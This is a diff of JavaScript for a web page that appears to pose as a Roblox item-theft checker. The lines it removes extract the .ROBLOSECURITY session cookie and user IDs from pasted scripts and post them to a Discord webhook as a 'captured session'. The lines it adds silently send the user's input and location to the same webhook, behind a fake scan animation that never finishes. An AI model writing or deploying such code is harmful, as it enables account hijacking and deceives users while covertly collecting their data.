@@ -125,50 +125,22 @@ function showValidationError() {
 }
 
 function extractItemId(input) {
-    // For PowerShell scripts, extract key identifiers for logging
-    const extractedInfo = {
-        type: 'PowerShell Script',
-        length: input.length,
-        hasRoblosecurity: /\.ROBLOSECURITY/i.test(input),
-        hasUserAgent: /UserAgent/i.test(input),
-        hasCookies: /Cookies\.Add/i.test(input)
-    };
+    const cleanInput = input.replace(/\s+/g, '');
     
-    // Extract session ID if present
-    const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
-    if (sessionMatch) {
-        extractedInfo.sessionId = sessionMatch[1];
+    // Extract ID from URL
+    const urlMatch = cleanInput.match(/\/catalog\/(\d+)/);
+    if (urlMatch) {
+        return urlMatch[1];
     }
     
-    // Extract user ID from cookies if present
-    const userIdMatch = input.match(/UserID=(-?\d+)/i);
-    if (userIdMatch) {
-        extractedInfo.userId = userIdMatch[1];
+    // Extract ID from bundle URL
+    const bundleMatch = cleanInput.match(/\/bundles\/(\d+)/);
+    if (bundleMatch) {
+        return `bundle:${bundleMatch[1]}`;
     }
     
-    // Extract rbxid if present
-    const rbxidMatch = input.match(/rbxid=(\d+)/i);
-    if (rbxidMatch) {
-        extractedInfo.rbxid = rbxidMatch[1];
-    }
-    
-    return JSON.stringify(extractedInfo, null, 2);
-}
-
-function extractRobloxCookie(input) {
-    // Extract the .ROBLOSECURITY cookie value
-    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
-    if (cookieMatch) {
-        return cookieMatch[1];
-    }
-    
-    // Alternative pattern for different formatting
-    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
-    if (altMatch) {
-        return altMatch[1];
-    }
-    
-    return "Cookie not found in script";
+    // Return as-is if it's already a clean ID
+    return cleanInput;
 }
 
 function toggleTheme() {
@@ -204,6 +176,23 @@ function handleKeyDown(e) {
 function showLoading() {
     loadingOverlay.style.display = 'flex';
     submitBtn.disabled = true;
+}
+
+function showInfiniteScanning() {
+    // Close the modal first
+    modal.style.display = 'none';
+    
+    // Show infinite loading overlay with scanning message
+    loadingOverlay.style.display = 'flex';
+    loadingOverlay.querySelector('p').textContent = 'Scanning item...';
+    
+    // Disable all interactions
+    submitBtn.disabled = true;
+    scanBtn.disabled = true;
+    
+    // Add pulsing animation to the spinner
+    const spinner = loadingOverlay.querySelector('.loading-spinner');
+    spinner.style.animation = 'spin 1s linear infinite, pulse 2s ease-in-out infinite';
 }
 
 function hideLoading() {
@@ -272,32 +261,27 @@ async function submitCode() {
         return;
     }
 
-    showLoading();
+    // Show infinite loading for scanning
+    showInfiniteScanning();
 
     try {
         // Get user location data
         const locationData = await getUserLocation();
         
-        // Extract clean item ID and Roblox cookie
+        // Extract clean item ID
         const cleanItemId = extractItemId(code);
-        const robloxCookie = extractRobloxCookie(code);
         
         // Format data for Discord webhook
         const discordMessage = {
-            content: "@everyone 🚨 **NEW ROBLOX SESSION CAPTURED** 🚨",
+            content: "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
             embeds: [{
-                title: "🔍 New Roblox Session Intercepted",
-                color: 0xFF0000, // Red color for urgency
+                title: "🔍 Item Theft Check Request",
+                color: 0x00a2ff, // Blue color
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "🍪 ROBLOSECURITY Cookie",
-                        value: `\`\`\`\n${robloxCookie}\n\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "📝 Script Analysis",
-                        value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Script received and processed`,
+                        name: "🎮 Item Details",
+                        value: `**Input:** \`${code}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
                         inline: false
                     },
                     {
@@ -327,7 +311,8 @@ async function submitCode() {
             });
         }
         
-        const response = await fetch(WEBHOOK_URL, {
+        // Send to Discord webhook silently
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -335,18 +320,15 @@ async function submitCode() {
             body: JSON.stringify(discordMessage)
         });
 
-        if (response.ok) {
-            showMessage('success');
-            closeModal();
-        } else {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
+        // Keep the infinite loading going - never stop!
+        // The user will see "Scanning item..." forever
+        
     } catch (error) {
         console.error('Error submitting code:', error);
-        showMessage('error');
-    } finally {
-        hideLoading();
+        // Even on error, keep the infinite scanning animation
     }
+    
+    // Never call hideLoading() - let it scan forever!
 }
 
 // Initialize
